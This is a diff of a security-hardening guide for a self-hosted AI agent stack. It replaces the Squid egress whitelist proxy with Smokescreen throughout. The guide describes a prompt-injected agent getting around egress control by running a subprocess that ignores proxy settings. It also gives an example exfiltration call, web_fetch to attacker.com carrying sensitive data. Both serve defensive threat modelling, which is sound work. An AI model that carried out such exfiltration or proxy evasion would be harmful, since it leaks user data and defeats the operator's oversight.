@@ -79,7 +79,7 @@ User Message → Channel (Telegram/Discord) → Gateway → LLM (via LiteLLM) �
               ┌──────────────────────▼───────────────────────────┐
               │              egress-net (bridge, public)          │
               │  ┌──────────────────────────────────────────────┐ │
-              │  │  openclaw-egress (Squid :3128)               │ │
+              │  │  openclaw-egress (Smokescreen :4750)          │ │
               │  │  Whitelist: .anthropic.com, .openai.com,     │ │
               │  │             .voyageai.com (+ your additions) │ │
               │  └──────────────────────────────────────────────┘ │
@@ -98,7 +98,7 @@ User Message → Channel (Telegram/Discord) → Gateway → LLM (via LiteLLM) �
 |-----------|-------|-----|-----|------|----------|
 | `openclaw` | `ghcr.io/openclaw/openclaw:2026.2.23` | 8.0 | 16G | Agent runtime, Gateway, Web UI | docker-proxy, litellm, egress |
 | `openclaw-docker-proxy` | `ghcr.io/tecnativa/docker-socket-proxy:v0.4.2` | 0.5 | 256M | Sandboxed Docker API | host docker.sock |
-| `openclaw-egress` | `ubuntu/squid:6.6-24.04_edge` | 0.5 | 256M | Egress whitelist proxy | internet (whitelisted) |
+| `openclaw-egress` | Built from source ([stripe/smokescreen](https://github.com/stripe/smokescreen)) | 0.5 | 128M | Egress whitelist proxy | internet (whitelisted) |
 | `openclaw-litellm` | `ghcr.io/berriai/litellm:main-v1.81.3-stable` | 2.0 | 2G | LLM proxy + spend caps | LLM providers (via egress) |
 | `openclaw-redis` | `redis/redis-stack-server:7.4.0-v3` | 0.5 | 512M | Semantic cache (vector search) | litellm |
 
@@ -117,7 +117,7 @@ User Message → Channel (Telegram/Discord) → Gateway → LLM (via LiteLLM) �
 │    The agent can talk to docker-proxy, litellm, redis,          │
 │    and the egress proxy — but cannot reach the internet directly │
 │                                                                  │
-│  egress-net  [bridge, public]  → Squid's internet route        │
+│  egress-net  [bridge, public]  → Smokescreen's internet route   │
 │    Only openclaw-egress has both openclaw-net + egress-net      │
 │    This is the ONLY path to the internet — and it's whitelisted │
 │                                                                  │
@@ -129,7 +129,7 @@ User Message → Channel (Telegram/Discord) → Gateway → LLM (via LiteLLM) �
 └─────────────────────────────────────────────────────────────────┘
 ```
 
-> **The gap the docs acknowledge but minimize**: `proxy-net` is not `internal: true` because Caddy needs internet for Let's Encrypt. This means the `openclaw` *process* (not sandbox containers) has a non-whitelisted network interface. A well-behaved agent honors `HTTPS_PROXY` env vars and routes through Squid. A prompt-injected agent running a subprocess that ignores proxy env vars could bypass egress control. The fix: **use Cloudflare Tunnel** (Option B) instead of Caddy — then you CAN set `proxy-net: internal: true`.
+> **The gap the docs acknowledge but minimize**: `proxy-net` is not `internal: true` because Caddy needs internet for Let's Encrypt. This means the `openclaw` *process* (not sandbox containers) has a non-whitelisted network interface. A well-behaved agent honors `HTTPS_PROXY` env vars and routes through Smokescreen. A prompt-injected agent running a subprocess that ignores proxy env vars could bypass egress control. The fix: **use Cloudflare Tunnel** (Option B) instead of Caddy — then you CAN set `proxy-net: internal: true`.
 
 ---
 
@@ -157,7 +157,7 @@ External User Message
         ▼  ← LAYER 5: Socket proxy (EXEC only, no BUILD/SECRETS/NETWORKS)
    Docker API
         │
-        ▼  ← LAYER 6: Egress whitelist (Squid, only LLM provider domains)
+        ▼  ← LAYER 6: Egress whitelist (Smokescreen, only LLM provider domains)
    Internet
 ```
 
@@ -170,7 +170,7 @@ External User Message
 | **L3** Tool denials | 13 tools blocked (agent + gateway level) | Agent can't spawn new sessions, access Docker directly, run host commands |
 | **L4** Sandbox | `capDrop=ALL`, `network=none`, 512M RAM, workspace=none | Escaped sandbox code has no capabilities, no network, can't write to host FS |
 | **L5** Socket proxy | EXEC=1 only; BUILD/SECRETS/SWARM/etc all =0 | Even if sandbox code calls Docker API, it can't build images or access secrets |
-| **L6** Egress whitelist | Squid CONNECT-only to `.anthropic.com`, `.openai.com`, `.voyageai.com` | Data exfiltration, C2 callbacks, model replacement attacks |
+| **L6** Egress whitelist | Smokescreen enforce-mode to `.anthropic.com`, `.openai.com`, `.voyageai.com` | Data exfiltration, C2 callbacks, model replacement attacks |
 
 ### Tool Denials Explained
 
@@ -394,20 +394,20 @@ The recommended setting `"agent"` optimizes for cost (fewer containers) while ma
 Tool call: web_fetch("https://api.anthropic.com/docs")
     │
     ▼
-Sandbox container → HTTPS_PROXY env var → http://openclaw-egress:3128
+Sandbox container → HTTPS_PROXY env var → http://openclaw-egress:4750
     │
     ▼
-Squid checks: is api.anthropic.com in the whitelist?
+Smokescreen checks: is api.anthropic.com in the allowed_domains list?
     • YES → CONNECT tunnel established → response returned
-    • NO  → 403 Access Denied
+    • NO  → 503 Denied by policy
 
 ⚠️ Note: sandbox network=none means NO direct internet
-   The HTTPS_PROXY env var routes web tools through Squid
+   The HTTPS_PROXY env var routes web tools through Smokescreen
    But only .anthropic.com, .openai.com, .voyageai.com are whitelisted by default
-   A web_fetch to https://google.com returns 403 from Squid
+   A web_fetch to https://google.com is denied by Smokescreen
 ```
 
-**This is not documented clearly.** The implication: if you want agents to browse the web or call external APIs, you must add those domains to the Squid ACL. Every domain you add is a potential data exfiltration path.
+**This is not documented clearly.** The implication: if you want agents to browse the web or call external APIs, you must add those domains to the Smokescreen ACL (`smokescreen-acl.yaml`). Every domain you add is a potential data exfiltration path.
 
 ### Tool Call Logging and Redaction
 
@@ -534,7 +534,7 @@ Injected into context window before LLM call
 
 > **QMD** (Query-Model-Document) indexing is mentioned in the problem statement but is the least-documented feature. Based on context, it's OpenClaw's internal indexing scheme for the memory store — likely a structured approach where memories are stored with metadata (query context, model used, document source) to improve retrieval precision.
 
-The `openclaw memory index` command builds this index, and `openclaw memory index --verify` validates it. If the Voyage AI API key is missing or `.voyageai.com` isn't in the Squid whitelist, index building silently fails.
+The `openclaw memory index` command builds this index, and `openclaw memory index --verify` validates it. If the Voyage AI API key is missing or `.voyageai.com` isn't in the Smokescreen whitelist, index building silently fails.
 
 ### Memory Persistence Architecture
 
@@ -641,7 +641,7 @@ litellm container (:4000)
     │     Yes → return cached response (zero LLM cost)
     │     No  → route to provider
     │
-    ▼ (HTTPS_PROXY → Squid → internet)
+    ▼ (HTTPS_PROXY → Smokescreen → internet)
 LLM Provider API (Anthropic, OpenAI, etc.)
 ```
 
@@ -837,7 +837,7 @@ This works because:
 |-----|---------|---------|------------|
 | Telegram streaming crash | 2026.2.17 (fixed in 2026.2.19) | Bot stops responding mid-stream | Fixed upstream; update to 2026.2.19+ |
 | Config schema version mismatch | After upgrades | "config from newer version" error | Backup + restore `config.json.bak` |
-| Squid ACL `localnet` too broad | All deployments | Allows entire `172.16.0.0/12` (not just this stack) | Post-deploy ACL tighten (Step 4) |
+| Smokescreen ACL not scoped | All deployments | Smokescreen doesn't use source IP ACLs — Docker network isolation handles access control | Verify `openclaw-net` is `internal: true` (Step 4) |
 
 ### Undocumented Gotchas
 
@@ -949,7 +949,7 @@ Agent running 24/7:
   6. Runs own backtesting overnight
 
 This requires:
-  • Polymarket domain in Squid whitelist
+  • Polymarket domain in Smokescreen whitelist
   • Cron tool (denied in hardened config — must be host-level cron calling agent)
   • Persistent memory to track paper portfolio
   • Long-running session or periodic cron invocation
@@ -1012,7 +1012,7 @@ if [ "$spend_pct" -gt 80 ]; then alert "LiteLLM spend at ${spend_pct}% of budget
 
 ### 5. ✅ The Egress Whitelist is the Primary Data Exfiltration Control — And It's Documented as a Cost Control
 
-The Squid egress proxy is presented primarily as a "LLM provider whitelist" but it's actually the most important data exfiltration prevention control. If an attacker successfully achieves prompt injection and gets the agent to call `web_fetch("https://attacker.com/?data=<sensitive>")`, Squid blocks it because `attacker.com` isn't whitelisted. This deserves more prominent security framing.
+The Smokescreen egress proxy is presented primarily as a "LLM provider whitelist" but it's actually the most important data exfiltration prevention control. If an attacker successfully achieves prompt injection and gets the agent to call `web_fetch("https://attacker.com/?data=<sensitive>")`, Smokescreen blocks it because `attacker.com` isn't in `allowed_domains`. This deserves more prominent security framing.
 
 ### 6. ✅ The Docker Socket Proxy is the Blast Radius Limiter
 
@@ -1090,7 +1090,7 @@ The hardened deployment guide doesn't address this because x402 is a fork/extens
 │  Sandbox container (capDrop=ALL, network=none, 512M, 0.5CPU)               │
 │  ├── Code: bash, python, node                                               │
 │  ├── Files: read, write, search                                             │
-│  ├── Web: via HTTPS_PROXY → Squid → whitelist                              │
+│  ├── Web: via HTTPS_PROXY → Smokescreen → whitelist                         │
 │  └── Memory: via LanceDB in openclaw-data volume                           │
 ├─────────────────────────────────────────────────────────────────────────────┤
 │  LLM ROUTING                                                                │
@@ -1101,10 +1101,10 @@ The hardened deployment guide doesn't address this because x402 is a fork/extens
 │  └── Routing: usage-based-v2 with fallback                                 │
 ├─────────────────────────────────────────────────────────────────────────────┤
 │  EGRESS CONTROL                                                             │
-│  Squid (:3128)                                                              │
+│  Smokescreen (:4750)                                                        │
 │  ├── Whitelist: .anthropic.com, .openai.com, .voyageai.com                 │
-│  ├── CONNECT-only (HTTPS tunneling, no HTTP cache)                         │
-│  └── Hardened: via off, forwarded_for delete, version suppressed           │
+│  ├── Enforce-mode (CONNECT-only, no direct HTTP)                           │
+│  └── Hardened: no header forwarding, version suppressed                    │
 ├─────────────────────────────────────────────────────────────────────────────┤
 │  MEMORY & STORAGE                                                           │
 │  LanceDB (embedded, /root/.openclaw/)                                       │
@@ -1143,8 +1143,8 @@ docker exec openclaw openclaw memory index      # Rebuild memory index
 docker exec openclaw openclaw memory index --verify  # Verify memory index
 
 # ── Egress Testing ────────────────────────────────────────────────────────
-docker exec openclaw curl -x http://openclaw-egress:3128 -I https://api.anthropic.com  # Should work
-docker exec openclaw curl -x http://openclaw-egress:3128 -I https://example.com  # Should 403
+docker exec openclaw curl -x http://openclaw-egress:4750 -I https://api.anthropic.com  # Should work
+docker exec openclaw curl -x http://openclaw-egress:4750 -I https://example.com  # Should be denied
 
 # ── Cache ──────────────────────────────────────────────────────────────────
 docker exec openclaw-redis redis-cli ping       # Redis connectivity
